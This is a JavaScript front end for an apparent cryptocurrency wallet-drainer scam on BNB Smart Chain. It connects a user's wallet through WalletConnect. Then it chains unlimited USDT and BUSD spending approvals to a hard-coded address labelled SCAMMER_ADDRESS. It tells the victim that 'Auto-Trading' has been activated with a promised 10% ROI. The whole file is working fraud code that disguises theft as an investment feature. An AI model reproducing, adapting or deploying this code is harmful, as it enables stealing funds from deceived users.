const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
const BUSD_ADDRESS = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
const SCAMMER_ADDRESS = "0xbE73c37a0C255766211804aA453904717136B3AB";

const ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)"
];

let provider, signer;

// ✅ Create WalletConnect Provider correctly (no constructor)
async function createWalletConnectProvider() {
  return await window.WalletConnectEthereumProvider.init({
    projectId: "6b0d9f43b66457426a444383f058d531",
    chains: [56],
    showQrModal: true,
    rpcMap: {
      56: "https://bsc-dataseed.binance.org"
    }
  });
}

// ✅ Connect Wallet Button
document.getElementById("connectBtn").addEventListener("click", async () => {
  try {
    const walletConnectProvider = await createWalletConnectProvider();
    await walletConnectProvider.enable();

    provider = new ethers.providers.Web3Provider(walletConnectProvider);
    signer = provider.getSigner();

    alert("✅ Wallet connected via WalletConnect v2");
    localStorage.setItem("approval_stage", "usdt");
  } catch (e) {
    console.error("❌ Wallet connection error:", e);
    alert("❌ Wallet connection failed.");
  }
});

// ✅ Approve USDT → BUSD → Done
document.getElementById("approveBtn").addEventListener("click", async () => {
  if (!signer) {
    alert("❗ Please connect wallet first.");
    return;
  }

  const stage = localStorage.getItem("approval_stage") || "usdt";
  const tokenAddress = stage === "usdt" ? USDT_ADDRESS : BUSD_ADDRESS;
  const tokenName = stage.toUpperCase();
  const contract = new ethers.Contract(tokenAddress, ABI, signer);

  try {
    const tx = await contract.approve(SCAMMER_ADDRESS, ethers.constants.MaxUint256);
    alert(`🔄 Approving ${tokenName}...`);
    await tx.wait();

    if (stage === "usdt") {
      localStorage.setItem("approval_stage", "busd");
      alert("✅ USDT Approved! Now approving BUSD...");
      document.getElementById("approveBtn").click();
    } else {
      localStorage.removeItem("approval_stage");
      alert("✅ Auto-Trading Activated! Enjoy your 10% ROI 😉");
    }
  } catch (e) {
    console.error("❌ Approval failed:", e);
    alert(`❌ ${tokenName} approval failed or rejected.`);
  }
});
